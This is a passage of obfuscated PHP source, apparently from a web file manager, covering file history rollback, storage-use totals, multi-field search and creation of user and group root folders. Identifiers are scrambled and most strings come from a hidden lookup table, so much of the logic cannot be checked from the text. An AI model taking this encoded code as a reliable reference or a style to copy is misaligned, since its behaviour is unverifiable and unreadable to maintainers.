"{$Š©èñÅ¨}\151\x6f\137\x66\x69\x6c\x65\40\x66\x69\154\x65\163\40\x6f\x6e\x20\x66\x69\x6c\145\163\56\x66\151\154\x65\x49\104\40\75\40\x68\151\163\164\x6f\162\x79\56\x66\151\x6c\x65\111\104"; return $this->alias($ôôæ§Â¢[2119])->where(array($ôôæ§Â¢[428] => $³úÒË¾µ))->join($¡€µÄ³Œ, $ôôæ§Â¢[2120])->find(); } public function removeItem($À£Ÿ×’´) { $ÊÃÈÛ‹Ì =& $_SERVER[ï»»·÷á]; $¹çì±´³ = array($ÊÃÈÛ‹Ì[428] => $À£Ÿ×’´); $Î˜«µ­ = $this->where($¹çì±´³)->find(); if ($Î˜«µ­) { $Šñª¨™Ê = $this->where($¹çì±´³)->delete(); Model($ÊÃÈÛ‹Ì[480])->remove($Î˜«µ­[$ÊÃÈÛ‹Ì[477]]); return $Šñª¨™Ê; } return !1; } public function removeBySource($ÓŸ—çÍ) { $Õ°ˆÒÈ =& $_SERVER[ï»»·÷á]; if (!$ÓŸ—çÍ) { return !1; } if (!is_array($ÓŸ—çÍ)) { $ÓŸ—çÍ = array($ÓŸ—çÍ); } $µ‘”Ë—¦ = array($Õ°ˆÒÈ[426] => array($Õ°ˆÒÈ[7], $ÓŸ—çÍ)); $ıÀì’Ÿ¯ = $this->field($Õ°ˆÒÈ[478])->where($µ‘”Ë—¦)->select(); if ($ıÀì’Ÿ¯) { $this->where($µ‘”Ë—¦)->delete(); $¨íôÛäŠ = array_to_keyvalue($ıÀì’Ÿ¯, $Õ°ˆÒÈ[12], $Õ°ˆÒÈ[477]); Model($Õ°ˆÒÈ[480])->remove($¨íôÛäŠ); } return !0; } public function setDetail($ãĞŸ€”¾, $øë‡ø…í) { $ëış–ãÈ =& $_SERVER[ï»»·÷á]; return $this->where(array($ëış–ãÈ[428] => $ãĞŸ€”¾))->save(array($ëış–ãÈ[2110] => $øë‡ø…í)); } public function rollbackToItem($®¶àÀÜú, $®Şñ™ëü) { $¢ŸñË¿ =& $_SERVER[ï»»·÷á]; $¢›êªÌù = Model($¢ŸñË¿[838])->sourceInfo($®¶àÀÜú); $this->addHistory($¢›êªÌù, LNG($¢ŸñË¿[2121])); $‡Ä¯¾‹ú = $this->find($®Şñ™ëü); $ÁÃš•ºŠ = array($¢ŸñË¿[477] => $‡Ä¯¾‹ú[$¢ŸñË¿[477]], $¢ŸñË¿[76] => $‡Ä¯¾‹ú[$¢ŸñË¿[76]], $¢ŸñË¿[85] => time(), $¢ŸñË¿[465] => USER_ID); Model($¢ŸñË¿[838])->where(array($¢ŸñË¿[411] => $®¶àÀÜú))->save($ÁÃš•ºŠ); return $this->where(array($¢ŸñË¿[428] => $®Şñ™ëü))->delete(); } public function clearSame($˜Ğ¯İó£) { $÷Õ¬´½– =& $_SERVER[ï»»·÷á]; $Ñ»çâ = $this->listData($˜Ğ¯İó£); $­™÷ı±§ = array_to_keyvalue_group($Ñ»çâ, $÷Õ¬´½–[477]); $‡š«œ¤ = array(); $²›œÉâÛ = array(); foreach ($­™÷ı±§ as $Ş”Ğ¶ë·) { if (!$Ş”Ğ¶ë· || count($Ş”Ğ¶ë·) <= 1) { continue; } foreach ($Ş”Ğ¶ë· as $Œã¥) { $‡š«œ¤[] = $Œã¥[$÷Õ¬´½–[477]]; $²›œÉâÛ[] = $Œã¥[$÷Õ¬´½–[399]]; } } if (!$²›œÉâÛ) { return; } $this->where(array($÷Õ¬´½–[399] => array($÷Õ¬´½–[7], $²›œÉâÛ)))->delete(); Model($÷Õ¬´½–[480])->remove($‡š«œ¤); } public function userSpace() { $ÛâË® =& $_SERVER[ï»»·÷á]; $µøŞÃ÷À = $this->tablePrefix; $ûƒ·¶¶õ = array($ÛâË®[1669] => USER_ID); $×ŸÊ›’ = "{$µøŞÃ÷À}\151\157\x5f\146\151\154\145\40\146\x69\154\x65\x73\40\x6f\156\40\146\151\154\x65\x73\x2e\x66\x69\x6c\145\x49\x44\x20\75\40\150\x69\163\x74\157\162\x79\x2e\146\x69\154\x65\x49\x44"; return $this->alias($ÛâË®[2119])->where($ûƒ·¶¶õ)->join($×ŸÊ›’, $ÛâË®[2120])->sum($ÛâË®[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($×ëÍ—í•) { $Ÿµ†ÌøÁ =& $_SERVER[ï»»·÷á]; $ßæìÔ» = KodIO::fileTypeList(); $Ğ©˜Èƒà = $ßæìÔ»[$×ëÍ—í•]; if (!$Ğ©˜Èƒà) { return array(); } $Üï†æùä = $Ğ©˜Èƒà[$Ÿµ†ÌøÁ[174]]; $öŸšæ¬Ÿ = $Ÿµ†ÌøÁ[7]; if (!$Ğ©˜Èƒà[$Ÿµ†ÌøÁ[174]]) { $Æùä‚º© = array_to_keyvalue($ßæìÔ», $Ÿµ†ÌøÁ[12], $Ÿµ†ÌøÁ[174]); $Üï†æùä = implode($Ÿµ†ÌøÁ[50], $Æùä‚º©); $öŸšæ¬Ÿ = $Ÿµ†ÌøÁ[2122]; } $ŒŠÖ…ç³ = explode($Ÿµ†ÌøÁ[50], trim($Üï†æùä, $Ÿµ†ÌøÁ[50])); return array($öŸšæ¬Ÿ, $ŒŠÖ…ç³); } public function listPathType($¬Ò—­ÈÆ) { $òşäÉëó =& $_SERVER[ï»»·÷á]; $¾À›¡èÉ = $this->fileTypeWhere($¬Ò—­ÈÆ); if (!$¾À›¡èÉ) { return array(); } $¢ÆÇ»¨ = USER_ID; $”¥ûÇş® = Model($òşäÉëó[534])->getInfo($¢ÆÇ»¨); $ÊÄ€ˆˆñ = array($òşäÉëó[585] => SourceModel::TYPE_USER, $òşäÉëó[520] => array($òşäÉëó[549], $òşäÉëó[530] . $”¥ûÇş®[$òşäÉëó[87]][$òşäÉëó[411]] . $òşäÉëó[550]), $òşäÉëó[586] => $¢ÆÇ»¨, $òşäÉëó[583] => 0, $òşäÉëó[584] => $¾À›¡èÉ); return $this->listSource($ÊÄ€ˆˆñ); } public function listSearch($ü£Ì‡¯ò, $ßâøª·‰ = 300) { $€˜îÄ =& $_SERVER[ï»»·÷á]; if (isset($ü£Ì‡¯ò[$€˜îÄ[1961]]) && $ü£Ì‡¯ò[$€˜îÄ[1961]]) { $ü£Ì‡¯ò[$€˜îÄ[1961]] = str_replace($€˜îÄ[384], $€˜îÄ[2123], trim($ü£Ì‡¯ò[$€˜îÄ[1961]])); } $Ñ¶ÕıÇÉ = $this->_parseSearchWhere($ü£Ì‡¯ò); if (!isset($Ñ¶ÕıÇÉ[$€˜îÄ[440]])) { $Ñ¶ÕıÇÉ[$€˜îÄ[440]] = 0; } $ú ³ö‚ = $€˜îÄ[2124]; $˜“’º­‹ = $Ñ¶ÕıÇÉ; $ßŠÈåÙ× = $ú ³ö‚; $this->_listSearchBindPinyin($ü£Ì‡¯ò, $Ñ¶ÕıÇÉ, $ú ³ö‚); $this->alias($€˜îÄ[455])->_makeOrder(); $Ñ¶ÕıÇÉ = $this->parseWhereLike($Ñ¶ÕıÇÉ); $Ã‡‡¬Òò = $this->distinct(!0)->field($ú ³ö‚)->where($Ñ¶ÕıÇÉ)->selectPage($ßâøª·‰); if ($GLOBALS[$€˜îÄ[6]][$€˜îÄ[381]][$€˜îÄ[382]] && Input::check($ü£Ì‡¯ò[$€˜îÄ[1961]], $€˜îÄ[592]) && $Ã‡‡¬Òò[$€˜îÄ[366]][$€˜îÄ[353]] == 1 && $Ã‡‡¬Òò[$€˜îÄ[366]][$€˜îÄ[367]] == 0) { $Ã‡‡¬Òò = $this->distinct(!0)->field($ú ³ö‚)->where($˜“’º­‹)->limit(1000)->select(); $Ã‡‡¬Òò = array_page_split($Ã‡‡¬Òò, !1, $ßâøª·‰); } $this->_listSearchFileContent($Ã‡‡¬Òò, $ü£Ì‡¯ò, $ßŠÈåÙ×, $˜“’º­‹); $this->_listSearchDesc($Ã‡‡¬Òò, $ü£Ì‡¯ò, $ßŠÈåÙ×); $this->_listSearchTag($Ã‡‡¬Òò, $ü£Ì‡¯ò, $ßŠÈåÙ×); $this->_listSearchGroupTag($Ã‡‡¬Òò, $ü£Ì‡¯ò, $ßŠÈåÙ×); $this->_listDataApply($Ã‡‡¬Òò[$€˜îÄ[369]]); $this->_listMake($Ã‡‡¬Òò); return $Ã‡‡¬Òò; } private function _listSearchFileContent(&$çÈÇæ„¢, $¹×ğëª», $¹ ™®Å, $—Êğé½Ù) { $ş„¿©€ =& $_SERVER[ï»»·÷á]; if (!$¹×ğëª»[$ş„¿©€[1961]] || $çÈÇæ„¢[$ş„¿©€[366]][$ş„¿©€[353]] > 1) { return; } if (!isset($—Êğé½Ù[$ş„¿©€[32]]) || !is_array($¹×ğëª»[$ş„¿©€[477]])) { return; } $—Êğé½Ù[$ş„¿©€[477]] = array($ş„¿©€[7], $¹×ğëª»[$ş„¿©€[477]]); unset($—Êğé½Ù[$ş„¿©€[32]]); unset($¹×ğëª»[$ş„¿©€[477]]); $Ó—¿ëÙû = $this->field($¹ ™®Å)->where($—Êğé½Ù)->limit($ş„¿©€[2125])->select(); if (!$Ó—¿ëÙû || count($Ó—¿ëÙû) == 0) { return; } $çÈÇæ„¢[$ş„¿©€[369]] = array_merge($Ó—¿ëÙû, $çÈÇæ„¢[$ş„¿©€[369]]); $çÈÇæ„¢[$ş„¿©€[366]][$ş„¿©€[367]] += count($Ó—¿ëÙû); } private function _listSearchTag(&$¬ğÄÆ·“, $º…ÖÏİ, $ó¿‡Ûêø) { $±ï“òë =& $_SERVER[ï»»·÷á]; if (!$º…ÖÏİ[$±ï“òë[1961]] || $¬ğÄÆ·“[$±ï“òë[366]][$±ï“òë[353]] > 1) { return; } $½è’¤›Ê = Model($±ï“òë[2126])->listData(); $“ÅÄ²è¢ = array(); $ÂÕ¯¸»˜ = $º…ÖÏİ[$±ï“òë[1961]]; foreach ($½è’¤›Ê as $×€˜ı´») { $ã½ÒÀÃø = $×€˜ı´»[$±ï“òë[32]]; $åıâµè = str_replace($±ï“òë[53], $±ï“òë[12], Pinyin::get($ã½ÒÀÃø)); if (stripos($ã½ÒÀÃø, $ÂÕ¯¸»˜) !== !1 || stripos($åıâµè, $ÂÕ¯¸»˜) !== !1) { $“ÅÄ²è¢[] = $×€˜ı´»[$±ï“òë[399]]; } } if (!$“ÅÄ²è¢) { return; } $‡õïÛå‰ = array($±ï“òë[435] => array($±ï“òë[7], $“ÅÄ²è¢), $±ï“òë[1678] => USER_ID); $şó”‘á = Model($±ï“òë[437])->field($±ï“òë[84])->where($‡õïÛå‰)->select(); $şó”‘á = array_to_keyvalue($şó”‘á, $±ï“òë[12], $±ï“òë[84]); $Æµì°‹ş = array_unique($şó”‘á); $this->_listSearchMerge($¬ğÄÆ·“, $º…ÖÏİ, $ó¿‡Ûêø, $Æµì°‹ş); } private function _listSearchDesc(&$Æ›ÜîƒŒ, $Õ·®´êÑ, $¯Û­•”Ğ) { $…§“¾¬ñ =& $_SERVER[ï»»·÷á]; if (!$Õ·®´êÑ[$…§“¾¬ñ[1961]] || $Æ›ÜîƒŒ[$…§“¾¬ñ[366]][$…§“¾¬ñ[353]] > 1) { return; } $¨ßƒÔü‹ = array($…§“¾¬ñ[94] => $…§“¾¬ñ[462], $…§“¾¬ñ[374] => array($…§“¾¬ñ[383], $…§“¾¬ñ[1963] . $Õ·®´êÑ[$…§“¾¬ñ[1961]] . $…§“¾¬ñ[1963])); $ ½šèÂß = !1; if ($ ½šèÂß) { $‰©¯ï®Ú = $this->listSearchChildren($Õ·®´êÑ[$…§“¾¬ñ[441]]); $‰©¯ï®Ú = array_unique($‰©¯ï®Ú); if (!$‰©¯ï®Ú) { return; } $¨ßƒÔü‹[$…§“¾¬ñ[411]] = array($…§“¾¬ñ[7], $‰©¯ï®Ú); } $Òİıúğ = Model($…§“¾¬ñ[569])->field($…§“¾¬ñ[411])->where($¨ßƒÔü‹)->limit(5000)->select(); $ÃÊç• = array_to_keyvalue($Òİıúğ, $…§“¾¬ñ[12], $…§“¾¬ñ[411]); $this->_listSearchMerge($Æ›ÜîƒŒ, $Õ·®´êÑ, $¯Û­•”Ğ, $ÃÊç•); } private function _listSearchGroupTag(&$øí¢ğÁ, $½ß¤Ÿ×‘, $ßÊ•êÀÚ) { $È³…ƒ¾Í =& $_SERVER[ï»»·÷á]; if (!$½ß¤Ÿ×‘[$È³…ƒ¾Í[1961]] || $øí¢ğÁ[$È³…ƒ¾Í[366]][$È³…ƒ¾Í[353]] > 1 || !$½ß¤Ÿ×‘[$È³…ƒ¾Í[441]]) { return; } $ ±…ËúÍ = $this->sourceInfo($½ß¤Ÿ×‘[$È³…ƒ¾Í[441]]); if (!$ ±…ËúÍ || $ ±…ËúÍ[$È³…ƒ¾Í[420]] != SourceModel::TYPE_GROUP) { return; } $ù£Ìú‚— = $ ±…ËúÍ[$È³…ƒ¾Í[505]]; $¯Üà¤üò = Model($È³…ƒ¾Í[2127])->get($ù£Ìú‚—); $ıÀ–±˜İ = array(); $”–ÏÇØŞ = $½ß¤Ÿ×‘[$È³…ƒ¾Í[1961]]; foreach ($¯Üà¤üò[$È³…ƒ¾Í[369]] as $æšõ„ãÛ) { $ïÛ‡¿ó´ = $æšõ„ãÛ[$È³…ƒ¾Í[32]]; $ØÆ‰àÅ‘ = str_replace($È³…ƒ¾Í[53], $È³…ƒ¾Í[12], Pinyin::get($ïÛ‡¿ó´)); if (stripos($ïÛ‡¿ó´, $”–ÏÇØŞ) !== !1 || stripos($ØÆ‰àÅ‘, $”–ÏÇØŞ) !== !1) { $ıÀ–±˜İ[] = $æšõ„ãÛ[$È³…ƒ¾Í[399]]; } } if (!$ıÀ–±˜İ) { return; } $»Ì¬èùÏ = array($È³…ƒ¾Í[435] => array($È³…ƒ¾Í[7], $ıÀ–±˜İ), $È³…ƒ¾Í[1678] => 0, $È³…ƒ¾Í[33] => $È³…ƒ¾Í[1983] . $ù£Ìú‚—); $šÉ¸Âª = Model($È³…ƒ¾Í[437])->field($È³…ƒ¾Í[84])->where($»Ì¬èùÏ)->select(); $šÉ¸Âª = array_to_keyvalue($šÉ¸Âª, $È³…ƒ¾Í[12], $È³…ƒ¾Í[84]); $¤òâîæé = array_unique($šÉ¸Âª); $this->_listSearchMerge($øí¢ğÁ, $½ß¤Ÿ×‘, $ßÊ•êÀÚ, $¤òâîæé); } private function _listSearchMerge(&$¨Úì÷ó, $²øº…³Æ, $ñçİ˜Ö©, $€®÷Š«°) { $´•Î°Ö’ =& $_SERVER[ï»»·÷á]; if (!$€®÷Š«°) { return; } $Ì¸Ñ€–æ = array_to_keyvalue($¨Úì÷ó[$´•Î°Ö’[369]], $´•Î°Ö’[12], $´•Î°Ö’[411]); $ğ«ˆ‘ğ = array_diff($€®÷Š«°, $Ì¸Ñ€–æ); if (!$ğ«ˆ‘ğ) { return; } $ôèÁ„ÔÊ = array($´•Î°Ö’[411] => array($´•Î°Ö’[7], $ğ«ˆ‘ğ)); $êŸõñóà = $this->field($ñçİ˜Ö©)->where($ôèÁ„ÔÊ)->select(); if (!$êŸõñóà) { return; } $àá±îğ† = array(); foreach ($êŸõñóà as $œÇü²çŞ) { if ($this->_listSearchFilter($œÇü²çŞ, $²øº…³Æ)) { $àá±îğ†[] = $œÇü²çŞ; } } $¨Úì÷ó[$´•Î°Ö’[369]] = array_merge($àá±îğ†, $¨Úì÷ó[$´•Î°Ö’[369]]); $¨Úì÷ó[$´•Î°Ö’[366]][$´•Î°Ö’[367]] += count($àá±îğ†); } private function _listSearchFilter($’Ğñ‚–û, $³®ĞÂ¡) { $¤œòµÖ =& $_SERVER[ï»»·÷á]; $ØèÊ«á = $’Ğñ‚–û[$¤œòµÖ[419]] == $¤œòµÖ[88]; if (!strstr($’Ğñ‚–û[$¤œòµÖ[520]], $¤œòµÖ[50] . $³®ĞÂ¡[$¤œòµÖ[441]] . $¤œòµÖ[50])) { return !1; } if (isset($³®ĞÂ¡[$¤œòµÖ[421]]) && $³®ĞÂ¡[$¤œòµÖ[421]] != $¤œòµÖ[1922]) { if ($³®ĞÂ¡[$¤œòµÖ[421]] == $¤œòµÖ[75] && !$ØèÊ«á) { return !1; } if ($³®ĞÂ¡[$¤œòµÖ[421]] != $¤œòµÖ[75] && $ØèÊ«á) { return !1; } if (!strstr($’Ğñ‚–û[$¤œòµÖ[174]], $¤œòµÖ[50] . $³®ĞÂ¡[$¤œòµÖ[421]] . $¤œòµÖ[50])) { return !1; } } if (isset($³®ĞÂ¡[$¤œòµÖ[2128]]) && $³®ĞÂ¡[$¤œòµÖ[2128]] < $’Ğñ‚–û[$¤œòµÖ[76]]) { return !1; } if (isset($³®ĞÂ¡[$¤œòµÖ[2129]]) && $³®ĞÂ¡[$¤œòµÖ[2129]] > $’Ğñ‚–û[$¤œòµÖ[76]]) { return !1; } if (isset($³®ĞÂ¡[$¤œòµÖ[599]]) && $³®ĞÂ¡[$¤œòµÖ[599]] != $’Ğñ‚–û[$¤œòµÖ[465]]) { return !1; } return !0; } public function listSearchChildren($Íš¹ä¶, $Áêª‡Øè = 5000) { $†®êªú =& $_SERVER[ï»»·÷á]; $·…Êº€ = array(); $Ğ´›¬½‹ = $this->sourceInfo($Íš¹ä¶); $½ì›¨ª½ = array($†®êªú[520] => array($†®êªú[383], $Ğ´›¬½‹[$†®êªú[520]] . $Ğ´›¬½‹[$†®êªú[411]] . $†®êªú[550])); $Á‡Òô£€ = $this->field($†®êªú[76])->where($½ì›¨ª½)->limit($Áêª‡Øè + 1)->select(); $¢àÖ¬¼™ = is_array($Á‡Òô£€) ? count($Á‡Òô£€) : 0; if ($¢àÖ¬¼™ > $Áêª‡Øè) { return $this->_listSearchChildrenNear($Íš¹ä¶, $Áêª‡Øè); } $—ÂŸÀıä = $this->field($†®êªú[411])->where($½ì›¨ª½)->select(); $·…Êº€ = array_to_keyvalue($—ÂŸÀıä, $†®êªú[12], $†®êªú[411]); return $·…Êº€; } private function _listSearchChildrenNear($şĞÄÎÂ, $‹â¦¿çú) { $úÏèà„º =& $_SERVER[ï»»·÷á]; $œ½üœ°® = array(); $½¡Ü—ß‚ = array($úÏèà„º[441] => $şĞÄÎÂ); $¾üœ½ = $this->field($úÏèà„º[2130])->where($½¡Ü—ß‚)->select(); $ŒîšÂª© = array_to_keyvalue(array_filter_by_field($¾üœ½, $úÏèà„º[419], $úÏèà„º[88]), $úÏèà„º[12], $úÏèà„º[411]); $œ½üœ°® = array_merge($œ½üœ°®, array_to_keyvalue($¾üœ½, $úÏèà„º[12], $úÏèà„º[411])); if (!$ŒîšÂª©) { return $œ½üœ°®; } $½¡Ü—ß‚ = array($úÏèà„º[441] => array($úÏèà„º[7], $ŒîšÂª©)); $¾üœ½ = $this->field($úÏèà„º[2130])->where($½¡Ü—ß‚)->limit($‹â¦¿çú)->select(); $œ½üœ°® = array_merge($œ½üœ°®, array_to_keyvalue($¾üœ½, $úÏèà„º[12], $úÏèà„º[411])); $œ½üœ°® = array_slice($œ½üœ°®, 0, $‹â¦¿çú); return $œ½üœ°®; } private function _listSearchBindPinyin($»°šš´³, &$‡ÈÃÁÆî, &$Ì™şæ) { $©™¥ò³Â =& $_SERVER[ï»»·÷á]; if (!isset($»°šš´³[$©™¥ò³Â[1961]]) || !$»°šš´³[$©™¥ò³Â[1961]]) { return; } if (!Input::check($»°šš´³[$©™¥ò³Â[1961]], $©™¥ò³Â[318]) || strlen($»°šš´³[$©™¥ò³Â[1961]]) < 2) { return; } $Şàè¥ï = "\114\x45\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x69\157\137\163\x6f\165\162\x63\145\x5f\155\145\164\141\40\x6d\x65\164\141\x20\157\156\40\163\x6f\x75\x72\143\x65\56\163\x6f\165\x72\x63\x65\111\x44\40\x3d\40\x6d\145\164\x61\x2e\163\x6f\x75\x72\x63\x65\111\x44"; $Û’­›Åë = array(); $Ì™şæ = str_replace(array($©™¥ò³Â[231], $©™¥ò³Â[53], $©™¥ò³Â[2131]), $©™¥ò³Â[12], $Ì™şæ); $Ì™şæ = $©™¥ò³Â[447] . str_replace($©™¥ò³Â[50], $©™¥ò³Â[448], $Ì™şæ); $µ¥²«ğ = $‡ÈÃÁÆî[$©™¥ò³Â[32]]; unset($‡ÈÃÁÆî[$©™¥ò³Â[32]]); foreach ($‡ÈÃÁÆî as $‰¬ªŞœŞ => $Ù¼ñæí) { $Û’­›Åë[$©™¥ò³Â[447] . $‰¬ªŞœŞ] = $Ù¼ñæí; } foreach ($µ¥²«ğ as $¼öÔàÌø) { $Û’­›Åë[] = array($©™¥ò³Â[452] => $¼öÔàÌø, $©™¥ò³Â[1010] => $©™¥ò³Â[1965], array($©™¥ò³Â[2132] => $¼öÔàÌø, $©™¥ò³Â[2133] => array($©™¥ò³Â[7], array($©™¥ò³Â[474], $©™¥ò³Â[473])))); } $this->join($Şàè¥ï); $‡ÈÃÁÆî = $Û’­›Åë; } private function _parseSearchWhere($µü³úÚÈ) { $šèÈğ =& $_SERVER[ï»»·÷á]; $€ĞÇÚşä = array(); if (isset($µü³úÚÈ[$šèÈğ[773]]) && $µü³úÚÈ[$šèÈğ[773]]) { $€ĞÇÚşä[$šèÈğ[85]] = array($šèÈğ[2134], $µü³úÚÈ[$šèÈğ[773]]); } if (isset($µü³úÚÈ[$šèÈğ[774]]) && $µü³úÚÈ[$šèÈğ[774]]) { $×ËÇÍ×¢ = array($šèÈğ[2135], $µü³úÚÈ[$šèÈğ[774]]); if ($€ĞÇÚşä[$šèÈğ[85]]) { $€ĞÇÚşä[$šèÈğ[85]] = array($€ĞÇÚşä[$šèÈğ[85]], $×ËÇÍ×¢, $šèÈğ[2136]); } else { $€ĞÇÚşä[$šèÈğ[85]] = $×ËÇÍ×¢; } } if (isset($µü³úÚÈ[$šèÈğ[2128]]) && $µü³úÚÈ[$šèÈğ[2128]] > 0) { $€ĞÇÚşä[$šèÈğ[76]] = array($šèÈğ[2134], $µü³úÚÈ[$šèÈğ[2128]]); } if (isset($µü³úÚÈ[$šèÈğ[2129]]) && $µü³úÚÈ[$šèÈğ[2129]]) { $×ËÇÍ×¢ = array($šèÈğ[2135], $µü³úÚÈ[$šèÈğ[2129]]); if ($€ĞÇÚşä[$šèÈğ[76]]) { $€ĞÇÚşä[$šèÈğ[76]] = array($€ĞÇÚşä[$šèÈğ[76]], $×ËÇÍ×¢, $šèÈğ[2136]); } else { $€ĞÇÚşä[$šèÈğ[76]] = $×ËÇÍ×¢; } } if (isset($µü³úÚÈ[$šèÈğ[599]]) && $µü³úÚÈ[$šèÈğ[599]]) { $€ĞÇÚşä[] = array($šèÈğ[465] => $µü³úÚÈ[$šèÈğ[599]], $šèÈğ[463] => $µü³úÚÈ[$šèÈğ[599]], $šèÈğ[1010] => $šèÈğ[1965]); } if (isset($µü³úÚÈ[$šèÈğ[421]]) && $µü³úÚÈ[$šèÈğ[421]]) { $¾ŞÙÎ¯Ì = $µü³úÚÈ[$šèÈğ[421]]; if ($¾ŞÙÎ¯Ì == $šèÈğ[75]) { $€ĞÇÚşä[$šèÈğ[419]] = 1; } else { if ($¾ŞÙÎ¯Ì == $šèÈğ[2137]) { $€ĞÇÚşä[$šèÈğ[419]] = 0; } else { if ($¾ŞÙÎ¯Ì) { $¾ŞÙÎ¯Ì = is_array($¾ŞÙÎ¯Ì) ? $¾ŞÙÎ¯Ì : explode($šèÈğ[50], $¾ŞÙÎ¯Ì); $€ĞÇÚşä[$šèÈğ[421]] = array($šèÈğ[427], $¾ŞÙÎ¯Ì); $€ĞÇÚşä[$šèÈğ[419]] = 0; } } } } $this->_parseSearchParent($µü³úÚÈ, $€ĞÇÚşä); if (isset($µü³úÚÈ[$šèÈğ[1961]]) && trim($µü³úÚÈ[$šèÈğ[1961]])) { $òø÷±» = trim($µü³úÚÈ[$šèÈğ[1961]]); $Œ±’šÚš = explode($šèÈğ[53], $òø÷±»); if (strlen($òø÷±») > 2 && (substr($òø÷±», 0, 1) == $šèÈğ[118] && substr($òø÷±», -1) == $šèÈğ[118]) || substr($òø÷±», 0, 1) == $šèÈğ[58] && substr($òø÷±», -1) == $šèÈğ[58]) { $òø÷±» = substr($òø÷±», 1, -1); $Œ±’šÚš = array($òø÷±»); } $€ĞÇÚşä[$šèÈğ[32]] = array(array($šèÈğ[549], $šèÈğ[1963] . $òø÷±» . $šèÈğ[1963])); if (count($Œ±’šÚš) > 1) { $€ĞÇÚşä[$šèÈğ[32]] = array(); foreach ($Œ±’šÚš as $ğöÕÈÈ²) { if (!trim($ğöÕÈÈ²)) { continue; } $€ĞÇÚşä[$šèÈğ[32]][] = array($šèÈğ[549], $šèÈğ[1963] . trim($ğöÕÈÈ²) . $šèÈğ[1963]); } } } return $€ĞÇÚşä; } private function _parseSearchParent($µÌÚ±Ü‰, &$ÍŸãäò) { $ï¶ÜŠ’ =& $_SERVER[ï»»·÷á]; if (!isset($µÌÚ±Ü‰[$ï¶ÜŠ’[441]]) || !$µÌÚ±Ü‰[$ï¶ÜŠ’[441]]) { return; } $¬í¶©½€ = $this->pathInfo($µÌÚ±Ü‰[$ï¶ÜŠ’[441]]); $»¤Ô¥„æ = $¬í¶©½€[$ï¶ÜŠ’[441]] . $ï¶ÜŠ’[12] === $ï¶ÜŠ’[198]; $™Ù°„Îâ = $¬í¶©½€[$ï¶ÜŠ’[420]] == $ï¶ÜŠ’[514]; if ($¬í¶©½€[$ï¶ÜŠ’[531]] == $ï¶ÜŠ’[532]) { $¢«‹— = $this->sourceInfo($µÌÚ±Ü‰[$ï¶ÜŠ’[441]]); $¬í¶©½€[$ï¶ÜŠ’[520]] = $¢«‹—[$ï¶ÜŠ’[520]]; } $ÍŸãäò[$ï¶ÜŠ’[589]] = array($ï¶ÜŠ’[549], $¬í¶©½€[$ï¶ÜŠ’[520]] . $µÌÚ±Ü‰[$ï¶ÜŠ’[441]] . $ï¶ÜŠ’[550]); $õŒŞÁö¢ = isset($µÌÚ±Ü‰[$ï¶ÜŠ’[1826]]) && in_array($ï¶ÜŠ’[514], $µÌÚ±Ü‰[$ï¶ÜŠ’[1826]]); if (!$õŒŞÁö¢ || !$™Ù°„Îâ || !$»¤Ô¥„æ || !$¬í¶©½€[$ï¶ÜŠ’[422]]) { return; } if (!AuthModel::authCheckRoot($¬í¶©½€[$ï¶ÜŠ’[422]][$ï¶ÜŠ’[423]])) { return; } $ÉØô›¸ë = $¬í¶©½€[$ï¶ÜŠ’[505]] . $ï¶ÜŠ’[12]; if ($ÉØô›¸ë == $ï¶ÜŠ’[88]) { unset($ÍŸãäò[$ï¶ÜŠ’[589]]); $ÍŸãäò[$ï¶ÜŠ’[420]] = self::TYPE_GROUP; return; } $–Œ®ÕçÖ = Model($ï¶ÜŠ’[521])->groupChildrenAll($ÉØô›¸ë); $Ø¬å¤ë = count($–Œ®ÕçÖ); if ($Ø¬å¤ë <= 1) { return; } $¢Ğ‰¬ó = array($ï¶ÜŠ’[441] => 0, $ï¶ÜŠ’[420] => self::TYPE_GROUP, $ï¶ÜŠ’[505] => array($ï¶ÜŠ’[7], $–Œ®ÕçÖ)); $±…Ù¡ºØ = $this->field($ï¶ÜŠ’[2138])->where($¢Ğ‰¬ó)->limit($Ø¬å¤ë)->select(); $ÍŸãäò[$ï¶ÜŠ’[589]] = array(); foreach ($±…Ù¡ºØ as $ÆœëïÍ) { $ÍŸãäò[$ï¶ÜŠ’[589]][] = array($ï¶ÜŠ’[549], $ï¶ÜŠ’[530] . $ÆœëïÍ[$ï¶ÜŠ’[411]] . $ï¶ÜŠ’[550]); } $ÍŸãäò[$ï¶ÜŠ’[589]][] = $ï¶ÜŠ’[1965]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÑÚ˜ÂÓ«) { $—Øïµ®ï =& $_SERVER[ï»»·÷á]; $¯¸¤Û¸Ó = Model($—Øïµ®ï[513])->where(array($—Øïµ®ï[1669] => $ÑÚ˜ÂÓ«))->find(); $àòÔ°‚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÑÚ˜ÂÓ«, $¯¸¤Û¸Ó[$—Øïµ®ï[32]]); $this->userDesktopAdd($àòÔ°‚); return $àòÔ°‚; } public function userDesktopAdd($óŒ¨££œ) { $Šñ–öğ =& $_SERVER[ï»»·÷á]; $ß¾¢–Äî = LNG($Šñ–öğ[2139]); $ı—Ì“¥½ = $this->mkdir($óŒ¨££œ, $ß¾¢–Äî); $this->metaSet($ı—Ì“¥½, $Šñ–öğ[2140], $Šñ–öğ[88]); $this->metaSet($óŒ¨££œ, $Šñ–öğ[2141], $ı—Ì“¥½); } public function userPathSafeAdd($Û¡ßÒÊ) { $åÚÁÊ¾ =& $_SERVER[ï»»·÷á]; $ºùØíÛ‹ = Model($åÚÁÊ¾[513])->getInfoFull($Û¡ßÒÊ); if (!$ºùØíÛ‹) { return !1; } if (_get($ºùØíÛ‹, $åÚÁÊ¾[535])) { return $ºùØíÛ‹[$åÚÁÊ¾[475]][$åÚÁÊ¾[2142]]; } $œÖ’·ÄË = $this->_mkdirRoot(SourceModel::TYPE_USER, $Û¡ßÒÊ, $åÚÁÊ¾[2143], $åÚÁÊ¾[442]); Model($åÚÁÊ¾[513])->metaSet($Û¡ßÒÊ, $åÚÁÊ¾[2142], $œÖ’·ÄË); $this->metaSet($œÖ’·ÄË, $åÚÁÊ¾[2144], $Û¡ßÒÊ); return $œÖ’·ÄË; } public function groupRootAdd($é·‹ìá‰) { $¼Ó‹öÛ =& $_SERVER[ï»»·÷á]; $ˆÒˆ™ò€ = Model($¼Ó‹öÛ[521])->where(array($¼Ó‹öÛ[1955] => $é·‹ìá‰))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $é·‹ìá‰, 